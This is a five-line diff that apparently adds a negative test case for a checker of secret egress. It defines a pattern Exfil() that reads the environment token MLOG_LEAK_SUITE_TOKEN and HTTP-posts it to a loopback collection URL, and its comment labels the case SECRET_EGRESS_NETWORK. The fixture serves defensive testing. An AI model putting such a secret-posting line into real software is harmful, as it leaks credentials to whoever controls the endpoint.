@@ -1,0 +1,5 @@
+// p24 — Promise attacked: "What it stops" / SECRET_EGRESS_NETWORK — env() secret posted to a private loopback URL (the pinned negative is named private_url_http_post)
+pattern Exfil() -> String {
+  let _ = http_post("http://127.0.0.1:9009/collect", env("MLOG_LEAK_SUITE_TOKEN"))
+  return "sent"
+}
